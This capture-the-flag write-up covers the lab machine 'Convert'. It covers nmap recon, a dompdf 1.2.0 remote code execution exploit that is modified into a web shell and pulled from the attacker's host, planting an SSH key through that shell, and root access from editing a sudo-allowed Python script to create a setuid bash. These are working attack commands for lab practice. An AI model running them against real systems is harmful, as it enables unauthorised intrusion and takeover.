# Convert

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.95:22
Open 10.0.2.95:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.95
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 d8:7a:1e:74:a2:1a:40:74:91:1f:81:9b:05:7c:9a:f6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIydUr81eDokIoIALo7fmXcLh0LIL3AV01R8dkDa/hstw76PQZrUQQH56OoVcNkTAXYGFlgjho/kBiYVVSsLGY=
|   256 28:9f:f8:ce:7b:5d:e1:a7:fa:23:c1:fe:00:ee:63:24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEKl/6u9ozvyJq2EMKssVf0DlTM0fEBbFT5zvJ300ryg
80/tcp open  http    syn-ack nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: HTML to PDF
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

Looks like a simpler convert from HTML to PDF

![writeup.png](/assets/pentest/hackmyvm/convert/writeup.png)

Metadata shows what software created the PDF
```bash
└─$ exiftool ~/Downloads/9708bea43c72dd7c0f1e76fc2fc6f453.pdf
ExifTool Version Number         : 12.76
File Name                       : 9708bea43c72dd7c0f1e76fc2fc6f453.pdf
Directory                       : /home/woyag/Downloads
File Size                       : 1982 bytes
File Modification Date/Time     : 2025:10:31 07:57:42-04:00
File Access Date/Time           : 2025:10:31 07:57:58-04:00
File Inode Change Date/Time     : 2025:10:31 07:58:02-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Producer                        : dompdf 1.2.0 + CPDF # <---
Create Date                     : 2025:10:31 11:56:56+00:00
Modify Date                     : 2025:10:31 11:56:56+00:00
Title                           : Example Domain
```

### RCE

- **[dompdf-rce](https://github.com/positive-security/dompdf-rce)**
- [https://positive.security/blog/dompdf-rce](https://positive.security/blog/dompdf-rce)

```bash
└─$ git clone https://github.com/positive-security/dompdf-rce.git
└─$ cd dompdf-rce/exploit
└─$ sed -i 's/localhost:9001/10.0.2.15/' exploit.css
└─$ sed -i 's/phpinfo()/system($_REQUEST[0])/' exploit_font.php
└─$ echo "<link rel=stylesheet href='http://10.0.2.15/exploit.css'>" > index.html
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.95 - - [31/Oct/2025 08:06:15] "GET / HTTP/1.1" 200 -
10.0.2.95 - - [31/Oct/2025 08:06:15] "GET /exploit.css HTTP/1.1" 200 -
10.0.2.95 - - [31/Oct/2025 08:06:15] "GET /exploit_font.php HTTP/1.1" 200 -
```

To access the file example was provided
```
http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php

http://{TARGET}:{PORT}/dompdf/lib/fonts/{FONT_FAMILY}_{FONT_WEIGHT}_{SRC_MD5}.php
```

```bash
└─$ echo -n 'http://10.0.2.15/exploit_font.php' | md5sum
eb8e7d09898e66cc3aa62425c7f8a149  -
```

```bash
└─$ curl 'http://10.0.2.95/dompdf/lib/fonts/exploitfont_normal_eb8e7d09898e66cc3aa62425c7f8a149.php' -so- --data-urlencode '0=id' | tail -1
uid=1000(eva) gid=1000(eva) groups=1000(eva)
```

## SSH

```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' > ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGLo6/w9ehmWuAAXXpb90TD0K/infTGgB/KBP/yCKITG woyag@kraken' > ~/.ssh/authorized_keys

└─$ curl 'http://10.0.2.95/dompdf/lib/fonts/exploitfont_normal_eb8e7d09898e66cc3aa62425c7f8a149.php' -so- --data-urlencode "0=mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGLo6/w9ehmWuAAXXpb90TD0K/infTGgB/KBP/yCKITG woyag@kraken' > ~/.ssh/authorized_keys"
```

```bash
└─$ ssh -i id_rsa eva@10.0.2.95
eva@convert:~$ id
uid=1000(eva) gid=1000(eva) groups=1000(eva)
```

### User.txt

```bash
eva@convert:~$ cat user.txt
f2be48d6f922bfc0a9bf45b22887c10d
```

## Privilege Escalation

```bash
eva@convert:~$ sudo -l
Matching Defaults entries for eva on convert:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User eva may run the following commands on convert:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *
```

```python
eva@convert:~$ cat /home/eva/pdfgen.py
from os import path
from time import time
from weasyprint import HTML, CSS
from urllib.parse import urlparse
from argparse import ArgumentParser
from logging import basicConfig, INFO, error, info, exception

def prune_log(log_file, max_size=1):
    try:
        log_size = path.getsize(log_file) / (1024 * 1024)
        if log_size > max_size:
            with open(log_file, 'w'):
                pass
            info(f"Log file pruned. Size exceeded {max_size} MB.")
            print(f"Log file pruned. Size exceeded {max_size} MB.")
    except Exception as e:
        print(f"Error pruning log file: {e}")

log_file = '/home/eva/pdf_gen.log'
prune_log(log_file)
basicConfig(level=INFO, filename=log_file, filemode='a',
            format='%(asctime)s - %(levelname)s - %(message)s')

def is_path_allowed(output_path):
    blocked_directories = ["/root", "/etc"]
    for directory in blocked_directories:
        if output_path.startswith(directory):
            return False
    return True

def url_html_to_pdf(url, output_path):
    block_schemes = ["file", "data"]
    block_hosts = ["127.0.0.1", "localhost"]
    blocked_directories = ["/root", "/etc"]

    try:
        start_time = time()

        scheme = urlparse(url).scheme
        hostname = urlparse(url).hostname

        if scheme in block_schemes:
            error(f"{scheme} scheme is Blocked")
            print(f"Error: {scheme} scheme is Blocked")
            return

        if hostname in block_hosts:
            error(f"{hostname} hostname is Blocked")
            print(f"Error: {hostname} hostname is Blocked")
            return

        if not is_path_allowed(output_path):
            error(f"Output path is not allowed in {blocked_directories} directories")
            print(f"Error: Output path is not allowed in {blocked_directories} directories")
            return

        html = HTML(url.strip())
        html.write_pdf(output_path, stylesheets=[CSS(string='@page { size: A3; margin: 1cm }')])

        end_time = time()
        elapsed_time = end_time - start_time
        info(f"PDF generated successfully at {output_path} in {elapsed_time:.2f} seconds")
        print(f"PDF generated successfully at {output_path} in {elapsed_time:.2f} seconds")

    except Exception as e:
        exception(f"Error: {e}")
        print(f"Error: {e}")

if __name__ == "__main__":
    parser = ArgumentParser(description="Convert HTML content from a URL to a PDF file.")
    parser.add_argument("-U", "--url", help="URL of the HTML content to convert", required=True)
    parser.add_argument("-O", "--out", help="Output file path for the generated PDF", default="/home/eva/output.pdf")

    args = parser.parse_args()
    url_html_to_pdf(args.url, args.out)
```

Since script is in our PWD we can modify it and do whatever as root.
```bash
eva@convert:~$ cp pdfgen.py pdfgen.py.bak
eva@convert:~$ sed -i '1i__import__("os").system("install -m4777 /bin/bash /tmp/rootbash")' pdfgen.py
eva@convert:~$ sudo python3 /home/eva/pdfgen.py -U http://example.com
eva@convert:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(eva) gid=1000(eva) euid=0(root) groups=1000(eva)
```

### Root.txt

```bash
rootbash-5.2# cat /root/root.txt
1cc872dad04d177e6732abbedf1e525b
```